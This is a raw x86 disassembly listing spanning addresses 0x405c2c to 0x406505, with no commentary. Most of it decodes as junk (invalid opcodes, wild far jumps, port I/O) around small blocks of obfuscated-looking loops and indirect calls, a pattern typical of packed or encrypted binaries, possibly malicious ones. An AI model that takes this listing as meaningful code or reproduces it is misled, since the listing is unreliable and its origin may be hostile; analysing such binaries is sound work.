  405c2c:	ret    0xee96
  405c2f:	scas   al,BYTE PTR es:[edi]
  405c30:	in     al,0x9d
  405c32:	cmp    DWORD PTR [esi],ebp
  405c34:	add    DWORD PTR [ebx+0x79],ebp
  405c37:	out    0x25,eax
  405c39:	(bad)  
  405c3a:	fs clc 
  405c3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c3d:	stos   BYTE PTR es:[edi],al
  405c3e:	mov    al,0x96
  405c40:	(bad)  
  405c41:	mov    ds:0xe246e05c,al
  405c46:	jle    0x405c82
  405c48:	jp     0x405bfa
  405c4a:	pop    ebp
  405c4b:	inc    edx
  405c4c:	mov    dh,dl
  405c4e:	es out 0xc5,al
  405c51:	xchg   edx,eax
  405c52:	mov    DWORD PTR [edi+0x43dd5316],ebx
  405c58:	cwde   
  405c59:	iret   
  405c5a:	scas   al,BYTE PTR es:[edi]
  405c5b:	jmp    0xf12e:0xa0ef404a
  405c62:	mov    bh,0xac
  405c64:	bnd ret 0x21de
  405c68:	clc    
  405c69:	mov    dl,0x7b
  405c6b:	hlt    
  405c6c:	lahf   
  405c6d:	add    ah,al
  405c6f:	popf   
  405c70:	das    
  405c71:	inc    BYTE PTR [ebx-0x4f]
  405c74:	dec    ecx
  405c75:	call   0xde19:0x46a4cf4b
  405c7c:	pushf  
  405c7d:	mov    ?,WORD PTR [esi-0x53]
  405c80:	xchg   esp,eax
  405c81:	lock mov bh,0x32
  405c84:	popf   
  405c85:	fsubr  st,st(5)
  405c87:	test   al,0x1b
  405c89:	or     DWORD PTR [eax-0x59],edx
  405c8c:	pop    ebp
  405c8d:	pop    ebp
  405c8e:	adc    al,0xd8
  405c90:	addr16 pop ebx
  405c92:	addr16 shr ebx,0x7d
  405c96:	cs out 0xfc,eax
  405c99:	cmp    al,0x9d
  405c9b:	(bad)  
  405c9c:	mov    al,0x80
  405c9e:	(bad)  
  405c9f:	xor    ecx,DWORD PTR [edx-0x6]
  405ca2:	mov    esi,0x1d730b32
  405ca7:	inc    ebp
  405ca8:	sahf   
  405ca9:	pop    fs
  405cab:	mov    al,ds:0x89004451
  405cb0:	inc    ebp
  405cb1:	lock mov eax,ds:0x4452ac
  405cb7:	sub    DWORD PTR ds:0x44e410,0x44b6cc
  405cc1:	mov    DWORD PTR [ebp-0x30],eax
  405cc4:	neg    eax
  405cc6:	mov    DWORD PTR [ebp-0xc],0xf89c8535
  405ccd:	adc    eax,DWORD PTR ds:0x424848
  405cd3:	mov    DWORD PTR [ebp-0x14],0xf89c8534
  405cda:	mov    eax,DWORD PTR [ebp-0xc]
  405cdd:	xor    DWORD PTR ds:0x44b6e0,0x59fc
  405ce7:	push   ebx
  405ce8:	or     DWORD PTR ds:0x424858,0x424850
  405cf2:	push   esi
  405cf3:	adc    DWORD PTR ds:0x424850,edi
  405cf9:	push   edi
  405cfa:	mov    DWORD PTR ds:0x44b6d4,0x13
  405d04:	cmp    DWORD PTR ds:0x44b6d4,0x0
  405d0b:	je     0x405e95
  405d11:	cmp    DWORD PTR ds:0x44b6d4,0x3
  405d18:	jne    0x405d31
  405d1e:	push   0x141c
  405d23:	push   0x6005
  405d28:	push   DWORD PTR [ebp-0xc]
  405d2b:	call   DWORD PTR ds:0x4430e0
  405d31:	cmp    DWORD PTR ds:0x44b6d4,0x4
  405d38:	jne    0x405d4d
  405d3e:	xor    edi,edi
  405d40:	xor    edi,DWORD PTR ds:0x44b6d4
  405d46:	dec    edi
  405d47:	mov    DWORD PTR ds:0x44b6d4,edi
  405d4d:	mov    edi,DWORD PTR ds:0x44b6d4
  405d53:	dec    edi
  405d54:	mov    DWORD PTR ds:0x44b6d4,edi
  405d5a:	jmp    0x405d04
  405d5f:	and    DWORD PTR ds:0x448988,0x5029
  405d69:	jmp    0x405e95
  405d6e:	out    0xd6,eax
  405d70:	(bad)  
  405d71:	sub    al,0xf9
  405d73:	sub    al,0xf9
  405d75:	jmp    0x592bcf2a
  405d7a:	xchg   esp,eax
  405d7b:	in     eax,dx
  405d7c:	jge    0x405d9d
  405d7e:	xchg   ecx,eax
  405d7f:	and    DWORD PTR [esp+edi*2+0xd],edi
  405d83:	jg     0x405e01
  405d85:	jl     0x405d8e
  405d87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d89:	scas   eax,DWORD PTR es:[edi]
  405d8a:	mov    dl,0x18
  405d8c:	out    dx,eax
  405d8d:	xchg   edx,eax
  405d8e:	mov    ah,0xea
  405d90:	mov    al,0x33
  405d92:	sbb    eax,0x5cdc2ce0
  405d97:	add    BYTE PTR [ebx],bl
  405d99:	pop    ecx
  405d9a:	xor    dh,BYTE PTR [esi+0x7f8c2ccc]
  405da0:	adc    ebx,DWORD PTR [ecx+edi*2]
  405da3:	add    eax,0x599904b7
  405da8:	or     edi,DWORD PTR [ecx]
  405daa:	loopne 0x405d53
  405dac:	fsubr  DWORD PTR [edi]
  405dae:	sti    
  405daf:	and    DWORD PTR [ebx+esi*8],edx
  405db2:	addr16 push esi
  405db4:	or     dh,dh
  405db6:	aam    0xc6
  405db8:	sub    eax,0xf3d04b58
  405dbd:	sbb    al,0x32
  405dbf:	adc    eax,0x2a33af38
  405dc4:	cmp    eax,0xbe1cd1f8
  405dc9:	rcr    ch,1
  405dcb:	fsub   DWORD PTR [esi+0x187bec16]
  405dd1:	loopne 0x405e20
  405dd3:	add    eax,eax
  405dd5:	or     BYTE PTR [ebx+0x7e],bl
  405dd8:	mov    edx,0x5eb9e682
  405ddd:	cwde   
  405dde:	fisttp WORD PTR [edx]
  405de0:	out    0x88,eax
  405de2:	fcmovnb st,st(1)
  405de4:	into   
  405de5:	rcr    al,1
  405de7:	imul   ebp,DWORD PTR [ebx-0x461e26f8],0x58
  405dee:	dec    edx
  405def:	in     al,dx
  405df0:	nop
  405df1:	xchg   esi,eax
  405df2:	lods   eax,DWORD PTR ds:[esi]
  405df3:	adc    eax,0xd29ff690
  405df8:	scas   eax,DWORD PTR es:[edi]
  405df9:	push   ebx
  405dfa:	leave  
  405dfb:	rcl    BYTE PTR [ecx-0x29650f2a],cl
  405e01:	mov    BYTE PTR [edx-0x2a72e636],cl
  405e07:	ins    BYTE PTR es:[edi],dx
  405e08:	out    0xaa,eax
  405e0a:	cmp    bl,BYTE PTR [ebp-0x68f94cb4]
  405e10:	(bad)  
  405e12:	stos   BYTE PTR es:[edi],al
  405e13:	imul   DWORD PTR [ebp+0x13]
  405e16:	out    dx,eax
  405e17:	push   ss
  405e18:	(bad)  
  405e19:	xchg   ebp,eax
  405e1a:	popf   
  405e1b:	out    0xea,al
  405e1d:	hlt    
  405e1e:	adc    edi,DWORD PTR [eax]
  405e20:	div    DWORD PTR [ebx]
  405e22:	pop    edx
  405e23:	jmp    0x72be:0x149bfc39
  405e2a:	push   0x74eb676e
  405e2f:	jns    0x405e12
  405e31:	jb     0x405e08
  405e33:	addr16 in eax,0xf4
  405e36:	pop    ebp
  405e37:	add    BYTE PTR [edi+0x6a],ch
  405e3a:	loopne 0x405e44
  405e3c:	mov    DWORD PTR [esi+0x7e687014],0x58c4aee2
  405e46:	hlt    
  405e47:	jge    0x405e0e
  405e49:	add    BYTE PTR [edx+0x62af90a1],bh
  405e4f:	push   esp
  405e50:	das    
  405e51:	push   esi
  405e52:	push   cs
  405e53:	es dec edx
  405e55:	test   al,0xc4
  405e57:	ds sub eax,0xdb6260a
  405e5d:	jl     0x405e82
  405e5f:	enter  0x9d90,0xc7
  405e63:	sub    eax,0xd1e102e6
  405e68:	cmp    al,0x7a
  405e6a:	pop    edi
  405e6b:	sbb    bh,BYTE PTR [ecx]
  405e6d:	mov    ?,ebp
  405e6f:	ins    DWORD PTR es:[edi],dx
  405e70:	fwait
  405e71:	add    BYTE PTR [ebp+0x3c5efa0f],0xec
  405e78:	outs   dx,DWORD PTR ds:[esi]
  405e79:	mov    bl,0xef
  405e7b:	mov    BYTE PTR [edi],cl
  405e7d:	jns    0x405e0b
  405e7f:	sub    al,0xc7
  405e81:	bound  ecx,QWORD PTR [edx]
  405e83:	adc    eax,0xd249fdc
  405e88:	push   cs
  405e89:	out    0x36,al
  405e8b:	pop    ss
  405e8c:	add    esp,DWORD PTR [ebx+0x3e992f09]
  405e92:	add    ecx,DWORD PTR [edx]
  405e94:	pop    esi
  405e95:	mov    esi,0x7510857
  405e9a:	xor    eax,esi
  405e9c:	movzx  edi,WORD PTR ds:0x410753
  405ea3:	xor    DWORD PTR ds:0x448980,edi
  405ea9:	mov    edi,0x32729e
  405eae:	jmp    0x405fda
  405eb3:	icebp  
  405eb4:	popa   
  405eb5:	jno    0x405f2b
  405eb7:	loope  0x405f1d
  405eb9:	mov    DWORD PTR [ecx-0x35],edi
  405ebc:	add    esi,DWORD PTR [esi+0x2d]
  405ebf:	std    
  405ec0:	je     0x405f33
  405ec2:	xsave  [eax]
  405ec5:	jl     0x405f43
  405ec7:	or     eax,0x957c7c7f
  405ecc:	cmp    al,0xc3
  405ece:	test   DWORD PTR [edx],esi
  405ed0:	enter  0x6b6b,0x12
  405ed4:	xchg   edi,eax
  405ed5:	popa   
  405ed6:	push   ebp
  405ed7:	push   esp
  405ed8:	and    eax,0x3a44c4dd
  405edd:	imul   ecx
  405edf:	jns    0x405f3a
  405ee1:	xchg   esp,eax
  405ee2:	push   ss
  405ee3:	jne    0x405f0a
  405ee5:	or     esi,DWORD PTR [edi+0x19e54b1f]
  405eeb:	into   
  405eec:	mov    edi,0x920dc6c9
  405ef1:	(bad)  
  405ef2:	jmp    0x1a7f:0x67ec7437
  405ef9:	rcl    DWORD PTR [ebx-0x70378e1b],1
  405eff:	cmc    
  405f00:	adc    ch,BYTE PTR [esi]
  405f02:	hlt    
  405f03:	sbb    edx,edi
  405f05:	inc    ecx
  405f06:	fwait
  405f07:	push   ss
  405f08:	es pop ss
  405f0a:	xor    eax,0xa9034a70
  405f0f:	xlat   BYTE PTR ds:[ebx]
  405f10:	and    eax,0xc17965ab
  405f15:	fbld   TBYTE PTR [ecx+0x7783654e]
  405f1b:	aas    
  405f1c:	(bad)  
  405f1d:	rol    DWORD PTR [ecx],cl
  405f1f:	sub    BYTE PTR [eax],dl
  405f21:	and    esp,DWORD PTR gs:[eax+edi*4+0x10]
  405f26:	stc    
  405f27:	adc    ebp,DWORD PTR [edx+0x3c72d8e8]
  405f2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f2e:	sbb    DWORD PTR [ecx+0x5a],eax
  405f31:	loopne 0x405ee0
  405f33:	sbb    esp,0x37ff8780
  405f39:	into   
  405f3a:	xor    al,0x51
  405f3c:	jl     0x405f22
  405f3e:	cmp    al,0x6c
  405f40:	cld    
  405f41:	sbb    edx,DWORD PTR [esi+0x30]
  405f44:	cmp    dh,ah
  405f46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f47:	fwait
  405f48:	nop
  405f49:	inc    ebp
  405f4a:	je     0x405fa2
  405f4c:	push   ebx
  405f4d:	adc    al,0x72
  405f4f:	imul   edx,esp,0x98fe2a9b
  405f55:	sub    ecx,DWORD PTR [esi-0x49]
  405f58:	jns    0x405f5d
  405f5a:	xchg   ebx,eax
  405f5b:	(bad)
  405f5f:	fdivr  QWORD PTR [edx]
  405f61:	push   edx
  405f62:	fnstcw WORD PTR ds:0x48ebe5f9
  405f68:	lods   al,BYTE PTR ds:[esi]
  405f69:	dec    esp
  405f6a:	adc    ebp,ecx
  405f6c:	sub    esp,esi
  405f6e:	(bad)  
  405f6f:	jns    0x405fe3
  405f71:	add    DWORD PTR [eax],eax
  405f73:	ror    DWORD PTR [esi+eiz*4],1
  405f76:	mov    ecx,0xb6c8d7ab
  405f7b:	and    bl,BYTE PTR [ebx-0x43]
  405f7e:	sub    BYTE PTR [eax+0x5e],ah
  405f81:	outs   dx,DWORD PTR ds:[esi]
  405f82:	xlat   BYTE PTR ds:[ebx]
  405f83:	scas   al,BYTE PTR es:[edi]
  405f84:	stc    
  405f85:	dec    eax
  405f86:	retf   
  405f87:	pop    ds
  405f88:	sahf   
  405f89:	inc    edx
  405f8a:	sub    DWORD PTR [edx+0x1a726fd],0x57
  405f91:	add    BYTE PTR [ebp+0x17],dl
  405f94:	scas   eax,DWORD PTR es:[di]
  405f96:	mov    bl,0x1b
  405f98:	jg     0x18b24fcd
  405f9e:	lds    eax,FWORD PTR [ecx+0x48b5eae2]
  405fa4:	and    ch,BYTE PTR [edi-0x30ad6d97]
  405faa:	push   ds
  405fab:	out    dx,eax
  405fac:	jmp    0x37c272dc
  405fb1:	lahf   
  405fb2:	adc    cl,bl
  405fb4:	jo     0x405f95
  405fb6:	mov    ds:0xcb1423f5,al
  405fbb:	and    ecx,edx
  405fbd:	pusha  
  405fbe:	mov    ds:0xa370c8fd,eax
  405fc3:	dec    esi
  405fc4:	xchg   esp,eax
  405fc5:	fnstcw WORD PTR [ecx+0x71b89030]
  405fcb:	adc    eax,ebp
  405fcd:	inc    ecx
  405fce:	dec    ecx
  405fcf:	dec    edx
  405fd0:	test   al,0x2d
  405fd2:	cmp    BYTE PTR [edx-0x5bbc7eba],cl
  405fd8:	loope  0x405fd2
  405fda:	add    eax,edi
  405fdc:	mov    DWORD PTR [ebp-0x20],eax
  405fdf:	mov    DWORD PTR ds:0x42484c,0x15
  405fe9:	cmp    DWORD PTR ds:0x42484c,0x0
  405ff0:	je     0x406021
  405ff6:	cmp    DWORD PTR ds:0x42484c,0x23
  405ffd:	jne    0x40600e
  406003:	push   0x410927
  406008:	call   DWORD PTR ds:0x4430e4
  40600e:	xor    eax,eax
  406010:	or     eax,DWORD PTR ds:0x42484c
  406016:	dec    eax
  406017:	mov    ds:0x42484c,eax
  40601c:	jmp    0x405fe9
  406021:	mov    DWORD PTR [ebp-0x28],0xf89cb535
  406028:	mov    DWORD PTR [ebp-0x34],0xf89f0535
  40602f:	mov    DWORD PTR ds:0x448994,0x1696
  406039:	mov    DWORD PTR [ebp-0x2c],0xf89c85f5
  406040:	or     DWORD PTR ds:0x44b6e0,edx
  406046:	mov    DWORD PTR [ebp-0x24],0xf89c85d5
  40604d:	and    DWORD PTR ds:0x410743,0x0
  406057:	jmp    0x40606a
  40605c:	xor    eax,eax
  40605e:	xor    eax,DWORD PTR ds:0x410743
  406064:	inc    eax
  406065:	mov    ds:0x410743,eax
  40606a:	cmp    DWORD PTR ds:0x410743,0x1c
  406071:	jae    0x4060ad
  406077:	cmp    DWORD PTR ds:0x410743,0x2b
  40607e:	jne    0x4060a3
  406084:	push   0x78a8
  406089:	push   0x44b6e0
  40608e:	push   0x8180
  406093:	push   0x6239
  406098:	push   0x1782
  40609d:	call   DWORD PTR ds:0x443364
  4060a3:	jmp    0x40605c
  4060a8:	xor    eax,0x3639
  4060ad:	mov    eax,DWORD PTR [ebp-0xc]
  4060b0:	add    DWORD PTR ds:0x4489a4,0x2d0a
  4060ba:	xor    eax,esi
  4060bc:	sbb    DWORD PTR ds:0x42483c,0x6315
  4060c6:	add    eax,edi
  4060c8:	mov    DWORD PTR [ebp-0x18],eax
  4060cb:	or     DWORD PTR ds:0x44e414,0x658e
  4060d5:	mov    DWORD PTR [ebp-0x1c],0xf89c8530
  4060dc:	mov    BYTE PTR [ebp-0x1],0x57
  4060e0:	or     DWORD PTR ds:0x448994,edi
  4060e6:	mov    eax,DWORD PTR [ebp-0xc]
  4060e9:	xor    eax,esi
  4060eb:	add    eax,edi
  4060ed:	sbb    DWORD PTR ds:0x410753,0x34b4
  4060f7:	mov    DWORD PTR [ebp-0x18],eax
  4060fa:	dec    DWORD PTR ds:0x448998
  406100:	mov    eax,DWORD PTR [ebp-0x24]
  406103:	xor    eax,esi
  406105:	adc    DWORD PTR ds:0x41074b,0x44898c
  40610f:	add    eax,edi
  406111:	xor    DWORD PTR ds:0x448994,0x44e420
  40611b:	push   eax
  40611c:	mov    eax,DWORD PTR [ebp-0x28]
  40611f:	xor    eax,esi
  406121:	sbb    DWORD PTR ds:0x44899c,0x1e41
  40612b:	add    eax,edi
  40612d:	xor    DWORD PTR ds:0x448994,0x44e424
  406137:	push   eax
  406138:	and    DWORD PTR ds:0x41073f,0x0
  406142:	mov    eax,ds:0x41073f
  406147:	inc    eax
  406148:	mov    ds:0x41073f,eax
  40614d:	cmp    DWORD PTR ds:0x41073f,0xc
  406154:	jne    0x406170
  40615a:	push   0x8a0b
  40615f:	push   0x44b6d0
  406164:	push   DWORD PTR [ebp-0x28]
  406167:	push   DWORD PTR [ebp-0x20]
  40616a:	call   DWORD PTR ds:0x4430e8
  406170:	cmp    DWORD PTR ds:0x41073f,0xb
  406177:	jne    0x40618b
  40617d:	xor    eax,eax
  40617f:	add    eax,DWORD PTR ds:0x41073f
  406185:	inc    eax
  406186:	mov    ds:0x41073f,eax
  40618b:	cmp    DWORD PTR ds:0x41073f,0x17
  406192:	jb     0x406142
  406198:	movzx  eax,BYTE PTR ds:0x424844
  40619f:	xor    DWORD PTR ds:0x44b6d8,eax
  4061a5:	mov    eax,DWORD PTR [ebp-0x1c]
  4061a8:	neg    DWORD PTR ds:0x42484c
  4061ae:	xor    eax,esi
  4061b0:	add    eax,edi
  4061b2:	or     DWORD PTR ds:0x44b6d8,0x41073f
  4061bc:	jmp    0x4062e8
  4061c1:	sar    DWORD PTR [ebp+0x7d793df9],cl
  4061c7:	sar    DWORD PTR [ebp+0x7a],cl
  4061ca:	sub    eax,0x1d5af1da
  4061cf:	and    DWORD PTR [ebp+0x7c7c23bf],0xd
  4061d6:	jg     0x406254
  4061d8:	jl     0x406224
  4061da:	xchg   ecx,eax
  4061db:	stos   BYTE PTR es:[edi],al
  4061dc:	dec    edi
  4061dd:	ret    
  4061de:	jecxz  0x40619b
  4061e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061e1:	mov    dl,0x1b
  4061e3:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4061e5:	popf   
  4061e6:	repnz clc 
  4061e8:	ds mov bh,0x4b
  4061eb:	dec    eax
  4061ec:	mov    esp,0xd0ce2746
  4061f1:	mov    dl,0xa7
  4061f3:	or     BYTE PTR [esi],cl
  4061f5:	js     0x406213
  4061f7:	mov    cl,0x9b
  4061f9:	in     al,dx
  4061fa:	loope  0x40623d
  4061fc:	mov    dh,ah
  4061fe:	fcomp  DWORD PTR [esi]
  406200:	lods   eax,DWORD PTR ds:[esi]
  406201:	xor    al,BYTE PTR [ebx+0x1a8626d9]
  406207:	fsub   DWORD PTR cs:[ebp-0x39]
  40620b:	loopne 0x406206
  40620d:	dec    esi
  40620e:	test   eax,0x55aaca45
  406213:	and    al,0x3f
  406215:	and    DWORD PTR [eax-0x1a],ebx
  406218:	push   eax
  406219:	sub    BYTE PTR [eax+0xac8ad05],dl
  40621f:	lods   eax,DWORD PTR ds:[esi]
  406220:	lds    ebp,FWORD PTR [eax]
  406222:	jl     0x4061d7
  406224:	adc    al,0x11
  406226:	add    DWORD PTR [ebp-0x41],ebx
  406229:	jecxz  0x406264
  40622b:	inc    esi
  40622c:	and    eax,0x11587bdd
  406231:	mov    ah,BYTE PTR [ebx+0x37]
  406234:	xor    eax,0x66b545c1
  406239:	dec    BYTE PTR [eax-0x2]
  40623c:	inc    ebx
  40623d:	dec    ecx
  40623e:	xor    DWORD PTR [esi+0x2],esp
  406241:	jg     0x406267
  406243:	int    0xeb
  406245:	imul   edx,DWORD PTR [edi+0x44],0x53
  406249:	adc    dh,dl
  40624b:	scas   al,BYTE PTR es:[edi]
  40624c:	sbb    eax,esi
  40624e:	shr    DWORD PTR [esi-0x5],1
  406251:	imul   eax,DWORD PTR [eax-0x13762862],0xffffffd7
  406258:	sub    ebp,DWORD PTR [ebx-0x40]
  40625b:	cwde   
  40625c:	inc    ecx
  40625d:	rol    bl,1
  40625f:	sar    dh,cl
  406261:	jb     0x406247
  406263:	sbb    al,BYTE PTR [ebp+0x7255b564]
  406269:	mov    bh,0x30
  40626b:	adc    eax,0x21206ca7
  406270:	or     ecx,DWORD PTR [eax+0x67]
  406273:	retf   
  406274:	mov    eax,ds:0xae4906a1
  406279:	pop    ebp
  40627a:	mov    ch,0xa8
  40627c:	or     ecx,edx
  40627e:	(bad)  
  40627f:	popa   
  406280:	push   esp
  406281:	ret    
  406282:	lock shl BYTE PTR [ebp-0x35d6121],1
  406289:	in     al,0xbd
  40628b:	adc    bh,0x14
  40628e:	inc    esi
  40628f:	(bad)  
  406290:	push   ebx
  406291:	cmp    DWORD PTR [esi+0x1a],edx
  406294:	sti    
  406295:	sbb    BYTE PTR [eax-0x6a],bh
  406298:	out    dx,al
  406299:	mov    al,ds:0xc9cd0be4
  40629e:	stos   DWORD PTR es:[edi],eax
  40629f:	xor    al,0x61
  4062a1:	xchg   ebx,eax
  4062a2:	pop    ds
  4062a3:	cli    
  4062a4:	jge    0x40622e
  4062a6:	dec    ebp
  4062a7:	xlat   BYTE PTR ds:[ebx]
  4062a8:	sub    ebx,DWORD PTR ds:0xa65f791b
  4062ae:	jae    0x406290
  4062b0:	test   al,0x71
  4062b2:	adc    BYTE PTR [esi],ah
  4062b4:	ss sub edi,ebp
  4062b7:	mov    DWORD PTR [edi+eax*4-0x1e],eax
  4062bb:	sbb    BYTE PTR ds:0x80e5e793,ah
  4062c1:	pop    ecx
  4062c2:	pop    ecx
  4062c3:	jp     0x40630e
  4062c5:	inc    ebp
  4062c6:	jecxz  0x406263
  4062c8:	ret    
  4062c9:	add    eax,0x8b82df54
  4062ce:	and    edx,0x5c
  4062d1:	xlat   BYTE PTR ds:[ebx]
  4062d2:	pop    esi
  4062d3:	pop    ecx
  4062d5:	mov    bl,0x10
  4062d7:	gs pushf 
  4062d9:	int    0x1d
  4062db:	pop    ecx
  4062dc:	pop    es
  4062dd:	nop
  4062de:	mov    ah,0xe2
  4062e0:	cld    
  4062e1:	sub    eax,0x2e76aaff
  4062e6:	pop    edi
  4062e7:	adc    dl,BYTE PTR [eax-0x73]
  4062ea:	inc    ebp
  4062eb:	mov    BYTE PTR [ecx+0x44e41005],al
  4062f1:	add    BYTE PTR [eax],bl
  4062f3:	in     al,0x44
  4062f5:	add    BYTE PTR [eax-0x7f],dl
  4062f8:	or     eax,0x4489a4
  4062fd:	dec    eax
  4062fe:	dec    eax
  4062ff:	inc    edx
  406300:	add    bh,bh
  406302:	jne    0x4062f8
  406304:	add    DWORD PTR ds:0x44b6cc,0x424850
  40630e:	jmp    0x40643a
  406313:	push   edx
  406314:	repz fist WORD PTR [ebp-0x4cadaa2f]
  40631b:	adc    DWORD PTR [esi-0x1e42cf51],esp
  406321:	pop    ds
  406322:	nop
  406323:	dec    esp
  406324:	and    bh,BYTE PTR [esp+edi*2+0xd]
  406328:	jg     0x4063a6
  40632a:	jl     0x4062be
  40632c:	inc    esi
  40632d:	adc    edi,DWORD PTR [eax+0x34]
  406330:	xchg   edx,eax
  406331:	rcr    cl,0xb3
  406334:	(bad)  
  406335:	shl    esi,cl
  406337:	mov    ch,BYTE PTR [esi+0x53]
  40633a:	data16 xor BYTE PTR [ebx],bh
  40633d:	mov    ds:0xd92199d7,al
  406342:	adc    BYTE PTR [edi-0x61a4b10d],bh
  406348:	push   ds
  406349:	jno    0x4063a6
  40634b:	ret    
  40634c:	sbb    BYTE PTR [esi+0x37],ch
  40634f:	xor    esp,esp
  406351:	xor    BYTE PTR [esi+0x69],0xb2
  406355:	dec    ebp
  406356:	adc    BYTE PTR [eax+edx*4-0x47],bh
  40635a:	enter  0xdbe9,0x38
  40635e:	jbe    0x40639f
  406360:	in     eax,0x2d
  406362:	sbb    al,0xfc
  406364:	sub    esi,DWORD PTR [eax]
  406366:	cdq    
  406367:	mov    edx,0x6ea2487e
  40636c:	jno    0x4062f1
  40636e:	push   ebp
  40636f:	inc    ecx
  406370:	sbb    ecx,edx
  406372:	push   ebp
  406373:	std    
  406374:	rcr    DWORD PTR [edi+0x41],1
  406377:	jbe    0x40632c
  406379:	cmp    eax,0xf81d882f
  40637e:	pop    ss
  40637f:	fbstp  TBYTE PTR [edi]
  406381:	pop    esi
  406382:	int3   
  406383:	lock mov ah,0x5f
  406386:	into   
  406387:	rcl    DWORD PTR [ecx-0x34be670],cl
  40638d:	outs   dx,DWORD PTR ds:[esi]
  40638e:	push   eax
  40638f:	sti    
  406390:	mov    BYTE PTR [edi+0x2950e8c3],bh
  406396:	sub    eax,esp
  406398:	mov    esi,0x8134dcda
  40639d:	aaa    
  40639e:	fcomp  st(7)
  4063a0:	xor    eax,0x8782b6a2
  4063a5:	sahf   
  4063a6:	rcl    ah,0x57
  4063a9:	cmc    
  4063aa:	push   0xe0a37bb2
  4063af:	cmp    DWORD PTR [edx+0x42cf192c],ebp
  4063b5:	add    bl,BYTE PTR [ebx+0x4b]
  4063b8:	loope  0x406374
  4063ba:	mov    ah,0x5
  4063bc:	out    dx,eax
  4063bd:	fs iret 
  4063bf:	mov    al,ds:0x46c036b1
  4063c4:	dec    edi
  4063c5:	test   eax,0xbedcc2ac
  4063ca:	mov    dh,0x2f
  4063cc:	imul   esp,DWORD PTR [edi],0x917c1baf
  4063d2:	adc    dh,BYTE PTR [esi-0x45]
  4063d5:	sbb    bh,BYTE PTR ds:0x63305141
  4063db:	cmp    BYTE PTR [ebx+0x2ee59420],dl
  4063e1:	mov    ebx,0x938e077c
  4063e6:	lods   al,BYTE PTR ds:[esi]
  4063e7:	ror    BYTE PTR [edi],0x1c
  4063ea:	inc    ecx
  4063eb:	(bad)  
  4063ec:	das    
  4063ed:	inc    esp
  4063ee:	jne    0x4063f1
  4063f0:	out    dx,al
  4063f1:	mov    esp,0x1218fbe5
  4063f6:	xchg   edx,eax
  4063f7:	imul   edx,DWORD PTR [ebx-0xd],0x7a
  4063fb:	fistp  DWORD PTR [eax+eiz*8]
  4063fe:	add    ch,BYTE PTR [esi-0x77]
  406401:	das    
  406402:	fld    DWORD PTR [edx+0x6ae5a53c]
  406408:	add    ebx,DWORD PTR [edx+ebx*2]
  40640b:	push   ecx
  40640c:	sti    
  40640d:	inc    esi
  40640e:	add    BYTE PTR [eax-0x2ee7281b],0x5e
  406415:	pop    eax
  406416:	into   
  406417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406418:	gs cmp eax,0x90e35e32
  40641e:	dec    edx
  40641f:	jno    0x406462
  406421:	sub    dh,al
  406423:	push   esi
  406424:	add    BYTE PTR ds:0x51577f3e,al
  40642a:	cmc    
  40642b:	fst    DWORD PTR [edx]
  40642d:	std    
  40642e:	mov    edi,0xfb257bbe
  406433:	add    BYTE PTR [esp+ecx*4+0x518ae8a7],dh
  40643a:	push   DWORD PTR [ebp-0x14]
  40643d:	jmp    0x406569
  406442:	xchg   BYTE PTR [edi-0x29ad99e],ah
  406448:	pop    edx
  406449:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40644a:	inc    eax
  40644b:	adc    al,0x79
  40644d:	sub    al,0x4d
  40644f:	xor    BYTE PTR [ebx+0x7c255d17],bl
  406455:	jl     0x406464
  406457:	jg     0x4064d5
  406459:	jl     0x4064ce
  40645b:	push   edx
  40645c:	cwde   
  40645d:	pop    ecx
  40645e:	adc    BYTE PTR [ebx-0x27],dl
  406461:	lea    esi,[esi-0x31]
  406464:	cmp    edi,edx
  406466:	mov    ebx,0xcd183846
  40646b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40646c:	add    al,BYTE PTR [esi]
  40646e:	cdq    
  40646f:	sti    
  406470:	rcl    DWORD PTR [ebp+0x40],cl
  406473:	push   es
  406474:	sub    al,0xdb
  406476:	das    
  406477:	test   eax,0x1334d795
  40647c:	ins    BYTE PTR es:[edi],dx
  40647d:	int3   
  40647e:	int3   
  40647f:	adc    ebp,ebp
  406481:	mov    ch,0xc7
  406483:	int3   
  406484:	mov    edi,0x4a6314ca
  406489:	pop    ebx
  40648a:	shl    DWORD PTR [ecx],1
  40648c:	xlat   BYTE PTR ds:[ebx]
  40648d:	cmp    DWORD PTR [ebp+0x48c83a97],ebp
  406493:	inc    ebp
  406494:	mov    edx,0x6c09c1de
  406499:	mov    eax,ds:0x799b651c
  40649e:	fs or  ch,dh
  4064a1:	mov    eax,0xf77e5573
  4064a6:	xor    eax,0x72f7223e
  4064ab:	or     DWORD PTR [ecx-0x7],ebx
  4064ae:	add    DWORD PTR [edi-0x59],ecx
  4064b1:	cmp    eax,0x7ef1a645
  4064b6:	int    0xb5
  4064b8:	(bad)
  4064bb:	xor    BYTE PTR [esi-0x19],0x5e
  4064bf:	mov    edx,0x3ffb1e3f
  4064c4:	add    ch,BYTE PTR [eax]
  4064c6:	les    esi,FWORD PTR [ecx-0x447a7e1f]
  4064cc:	das    
  4064cd:	ret    
  4064ce:	jle    0x4064d3
  4064d0:	repz (bad) 
  4064d2:	ins    BYTE PTR es:[edi],dx
  4064d3:	dec    esp
  4064d4:	sahf   
  4064d5:	data16 sahf 
  4064d7:	outs   dx,BYTE PTR ds:[esi]
  4064d8:	stc    
  4064d9:	pushf  
  4064da:	xlat   BYTE PTR ds:[ebx]
  4064db:	dec    esi
  4064dc:	loopne 0x406545
  4064de:	in     eax,dx
  4064df:	int    0x2f
  4064e1:	xor    ah,BYTE PTR [ebp-0x292d9185]
  4064e7:	test   eax,0x41ba59ec
  4064ec:	and    ebx,esi
  4064ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064ef:	sub    al,0x3c
  4064f1:	call   0x4426:0x721515ee
  4064f8:	mov    bl,0x95
  4064fa:	mov    ah,0xca
  4064fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064fd:	ret    0x644f
  406500:	mov    eax,0xce85f2c0
  406505:	push   ss
